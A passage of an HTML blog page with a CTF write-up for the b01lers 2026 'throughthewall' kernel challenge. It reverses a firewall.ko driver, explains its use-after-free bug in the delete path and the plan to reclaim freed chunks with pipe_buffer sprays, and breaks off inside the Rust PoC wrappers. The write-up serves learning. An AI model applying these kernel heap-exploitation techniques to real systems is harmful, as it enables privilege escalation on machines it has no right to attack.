@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>b01lers ctf 2026: kernel pwn (part 1) | </title>
+<meta name="title" content="b01lers ctf 2026: kernel pwn (part 1)" />
+<meta name="description" content="Writeup for kernel pwn challenge from b01lers ctf 2026." />
+<meta name="keywords" content="kernel,pwn," />
+
+
+<meta property="og:url" content="http://localhost:1313/blog/throughthewall/">
+  <meta property="og:title" content="b01lers ctf 2026: kernel pwn (part 1)">
+  <meta property="og:description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2026-04-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-30T00:00:00+00:00">
+    <meta property="article:tag" content="Kernel">
+    <meta property="article:tag" content="Pwn">
+    <meta property="og:image" content="http://localhost:1313/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/share.png">
+  <meta name="twitter:title" content="b01lers ctf 2026: kernel pwn (part 1)">
+  <meta name="twitter:description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
+
+
+
+
+  <meta itemprop="name" content="b01lers ctf 2026: kernel pwn (part 1)">
+  <meta itemprop="description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
+  <meta itemprop="datePublished" content="2026-04-30T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-30T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1946">
+  <meta itemprop="image" content="http://localhost:1313/images/share.png">
+  <meta itemprop="keywords" content="Kernel,Pwn">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  .rss-link {
+    display: inline-flex;
+    align-items: center;
+    color: inherit;
+    line-height: 1;
+    vertical-align: text-bottom;
+  }
+
+  .rss-link:hover {
+    text-decoration: none;
+  }
+
+  .rss-link .svg-icon {
+    width: 1rem;
+    height: 1rem;
+    fill: currentColor;
+    flex: none;
+  }
+
+  .rss-link .svg-icon.orange {
+    color: #f28c28;
+  }
+
+  .rss-link:hover .svg-icon.orange {
+    color: #e67900;
+  }
+</style>
+
+<style>
+   
+  .highlight, .code {
+    overflow-x: auto;
+    display: block;
+    width: 100%;
+  }
+
+  .highlight pre, .code pre {
+    width: max-content;
+    min-width: 100%;
+    margin: 0;
+  }
+     
+  img {
+    max-width: 100%;
+    height: auto;
+  }
+
+   
+  table {
+    display: block;
+    width: 100%;
+    overflow-x: auto;
+  }
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2></h2>
+</a>
+<nav>
+<a href="/">Home</a>
+
+<a href="/blog/">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>b01lers ctf 2026: kernel pwn (part 1)</h1>
+<p>
+  <i>
+    <time datetime='2026-04-30'>
+      30 Apr, 2026
+    </time>
+  </i>
+</p>
+
+<content>
+  <h1 id="intro">Intro</h1>
+<p>Hello! Recently, I competed in b01lersc.tf with team 0bscuri7y, where we placed 12th. I managed to solve all the pwn challenges, and in this post, I’ll walk through my solutions for the kernel pwn tasks: throughthewall (part 1) and multifiles (part 2).</p>
+<p><img src="/images/tw_1.png" alt="alt text"></p>
+<h1 id="throughthewall">throughthewall</h1>
+<p><a href="https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/b01lers.2026/throughthewall/handout.zip">download</a></p>
+<h2 id="recon">Recon</h2>
+<p><img src="/images/tw_2.png" alt="alt text"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#007020"></span><span style="color:#60a0b0;font-style:italic"># start.sh</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>qemu-system-x86_64 <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#4070a0;font-weight:bold"></span>    -m 256M <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#4070a0;font-weight:bold"></span>    -nographic <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#4070a0;font-weight:bold"></span>    -kernel ./bzImage <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#4070a0;font-weight:bold"></span>    -append <span style="color:#4070a0">&#34;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr&#34;</span> <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#4070a0;font-weight:bold"></span>    -no-reboot <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#4070a0;font-weight:bold"></span>    -cpu qemu64,+smep,+smap <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#4070a0;font-weight:bold"></span>    -smp <span style="color:#40a070">2</span> <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#4070a0;font-weight:bold"></span>    -initrd ./initramfs.cpio.gz <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#4070a0;font-weight:bold"></span>    -monitor /dev/null <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#4070a0;font-weight:bold"></span>    -s <span style="color:#4070a0;font-weight:bold">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#4070a0;font-weight:bold"></span>    2&gt;&amp;<span style="color:#40a070">1</span> | tee vm.log
+</span></span></code></pre></div><p>First, create the root directory and unpack the initramfs.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#007020">#!/bin/sh
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#007020"></span>mkdir -p root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#007020">cd</span> root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>gzip -dc ../initramfs.cpio.gz | cpio -idv
+</span></span></code></pre></div><p>Let&rsquo;s look at the init script. It provides two key insights:</p>
+<ol>
+<li>Communication with the driver is exposed to userland via <code>/dev/firewall</code> (<code>chmod 666</code>).</li>
+<li><code>/bin/drop_priv</code> runs in an infinite loop. Let&rsquo;s take a look at it before reversing the <code>.ko</code> module.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#60a0b0;font-style:italic">// drop_priv:main
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#60a0b0;font-style:italic"></span><span style="color:#902000">int</span> <span style="color:#06287e">main</span>(<span style="color:#902000">void</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>      <span style="color:#902000">gid_t</span> gid <span style="color:#666">=</span> <span style="color:#40a070">1000</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>      <span style="color:#06287e">setgroups</span>(<span style="color:#40a070">1</span>, <span style="color:#666">&amp;</span>gid);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      <span style="color:#06287e">setgid</span>(<span style="color:#40a070">1000</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#06287e">setuid</span>(<span style="color:#40a070">1000</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#06287e">chdir</span>(<span style="color:#4070a0">&#34;/home/ctf&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#06287e">execl</span>(<span style="color:#4070a0">&#34;/bin/sh&#34;</span>, <span style="color:#4070a0">&#34;sh&#34;</span>, <span style="color:#007020">NULL</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      <span style="color:#007020;font-weight:bold">return</span> <span style="color:#40a070">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  }
+</span></span></code></pre></div><p>We’ll use this shell wrapper later.</p>
+<h2 id="analysing-the-module">Analysing the module</h2>
+<p><em>firewall.ko</em>
+It exposes four ioctl commands:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>FW_ADD_RULE   <span style="color:#40a070">0x41004601UL</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>FW_DEL_RULE   <span style="color:#40a070">0x40044602UL</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>FW_EDIT_RULE  <span style="color:#40a070">0x44184603UL</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>FW_SHOW_RULE  <span style="color:#40a070">0x84184604UL</span>
+</span></span></code></pre></div><p><code>FW_EDIT_RULE</code> writes user-controlled data into the object referenced by <code>rules[idx]</code>. Because the delete path leaves a dangling pointer behind, this function can also be used to modify a freed-and-reclaimed
+object.</p>
+<p><code>FW_SHOW_RULE</code> reads data from the object referenced by <code>rules[idx]</code> and returns it to userland. Since freed entries are not cleared, it can also be used to inspect a reclaimed object through a stale pointer.</p>
+<p>The bug itself is in the delete path. <code>FW_DEL_RULE</code> checks that <code>rules[idx]</code> exists and then calls <code>kfree(rules[idx])</code>, but it never clears the global pointer:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#06287e">kfree</span>(rules[idx]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#60a0b0;font-style:italic">// missing: rules[idx] = NULL;
+</span></span></span></code></pre></div><p>As a result, the same index remains usable after free. <code>FW_SHOW_RULE</code> becomes a stale read primitive, and <code>FW_EDIT_RULE</code> becomes a stale write primitive over whatever object later reclaims that chunk.</p>
+<h2 id="heap-objects">Heap Objects</h2>
+<p>In <code>fw_add_rule</code>, heap chunks are allocated with:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#06287e">kmem_cache_alloc_trace</span>(kmalloc_caches[<span style="color:#40a070">10</span>], <span style="color:#40a070">0x400CC0</span>, <span style="color:#40a070">0x400</span>);
+</span></span></code></pre></div><p>This is a regular <code>kmalloc</code> allocation from the <code>kmalloc-1k</code> cache.</p>
+<p>When I was first learning the ropes on pawnyable.cafe, my first instinct for this primitive would have been to use tty_struct. This approach relies on being able to open /dev/ptmx, but a quick check of the environment showed that /dev/pts isn&rsquo;t mounted. Without that, this classic technique isn&rsquo;t viable here.</p>
+<p>After looking for alternatives, I found that <a href="https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/">pipe_buffer</a> is also suitable. Like <code>tty_struct</code>, it contains pointers that can be abused, and it lands in the right size class for our freed chunks.</p>
+<p>The size also works out nicely. A single <code>pipe_buffer</code> is <code>0x28</code> bytes, and the default pipe ring has 16 slots:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>sizeof(struct pipe_buffer) = 0x28
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>16 * 0x28 = 0x280
+</span></span></code></pre></div><p>The kernel allocates the pipe buffer array with <code>kcalloc()</code>, and a <code>0x280</code>-byte request is served from the same <code>kmalloc-1k</code> cache as the freed <code>0x400</code>-byte firewall rules. That makes it a good reclaim target for this UAF.</p>
+<h2 id="first-steps">First steps</h2>
+<p>The next step is to allocate 128 rules and free them. Then we spray <code>pipe_buffer</code> arrays into those freed slots.
+Let&rsquo;s start by adding one rule. Reversing <code>fw_add_rule()</code> gives us the ioctl argument format.
+fw_add_rule()</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span> slot_idx <span style="color:#666">=</span> <span style="color:#06287e">copy_from_user</span>(user_buf, user_rule, <span style="color:#40a070">256</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  <span style="color:#007020;font-weight:bold">if</span> ( slot_idx )
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#007020;font-weight:bold">return</span> <span style="color:#40a070">0xFFFFFFFFFFFFFFF2LL</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  <span style="color:#007020;font-weight:bold">while</span> ( rules[slot_idx] )                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    <span style="color:#007020;font-weight:bold">if</span> ( <span style="color:#666">++</span>slot_idx <span style="color:#666">==</span> <span style="color:#40a070">256</span> )
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>      <span style="color:#007020;font-weight:bold">return</span> <span style="color:#666">-</span><span style="color:#40a070">12</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>  rule <span style="color:#666">=</span> <span style="color:#06287e">kmem_cache_alloc_trace</span>(kmalloc_caches[<span style="color:#40a070">10</span>], <span style="color:#40a070">0x400CC0u</span>, <span style="color:#40a070">0x400u</span>);
+</span></span></code></pre></div><p>The function searches for a free slot in <code>rules[]</code>. That slot index is later returned to userland from <code>fw_add_rule_success_store()</code>.</p>
+<p>From <code>parse_rule()</code>, we can recover the internal <code>firewall_rule</code> structure:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#40a070">00000000</span> <span style="color:#007020;font-weight:bold">struct</span> firewall_rule <span style="color:#60a0b0;font-style:italic">// sizeof=0x400
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#60a0b0;font-style:italic"></span><span style="color:#40a070">00000000</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#40a070">00000000</span>     u32 src_ip;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#40a070">00000004</span>     u32 dst_ip;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#40a070">0000000</span><span style="color:#40a070">8</span>     u16 dport;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#40a070">0000000</span>A     u16 action;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span><span style="color:#40a070">0000000</span>C     <span style="color:#902000">char</span> desc[<span style="color:#40a070">1012</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span><span style="color:#40a070">00000400</span> };
+</span></span></code></pre></div><p>This internal structure is created by parsing our input string. The expected format is:</p>
+<pre tabindex="0"><code>&lt;src_ip&gt; &lt;dst_ip&gt; &lt;dport&gt; &lt;action&gt; &lt;desc&gt;
+</code></pre><p>These are the wrappers we will use in the PoC:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020;font-weight:bold">fn</span> <span style="color:#06287e">fw_add</span>(fd: <span style="color:#0e84b5;font-weight:bold">c_int</span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#0e84b5;font-weight:bold">io</span>::<span style="color:#007020">Result</span><span style="color:#666">&lt;</span><span style="color:#902000">i32</span><span style="color:#666">&gt;</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">mut</span><span style="color:#bbb"> </span>rule<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>[<span style="color:#40a070">0</span>;<span style="color:#bbb"> </span><span style="color:#40a070">0x100</span>];<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>text<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#4070a0">b</span><span style="color:#4070a0">&#34;1.1.1.1 2.2.2.2 80 1 cafe&#34;</span>;<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#bbb">    </span>rule[<span style="color:#666">..</span>text.len()].copy_from_slice(text);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>idx<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>ioctl(fd,<span style="color:#bbb"> </span>IoctlCMD::<span style="color:#60add5">FW_ADD_RULE</span><span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">as</span><span style="color:#bbb"> </span>c_ulong,<span style="color:#bbb"> </span>rule.as_ptr())<span style="color:#bbb"> </span>};<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">if</span><span style="color:#bbb"> </span>idx<span style="color:#bbb"> </span><span style="color:#666">&lt;</span><span style="color:#bbb"> </span><span style="color:#40a070">0</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#bbb">        </span><span style="color:#007020">Err</span>(io::Error::last_os_error())<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#bbb">    </span>}<span style="color:#bbb"> </span><span style="color:#007020;font-weight:bold">else</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
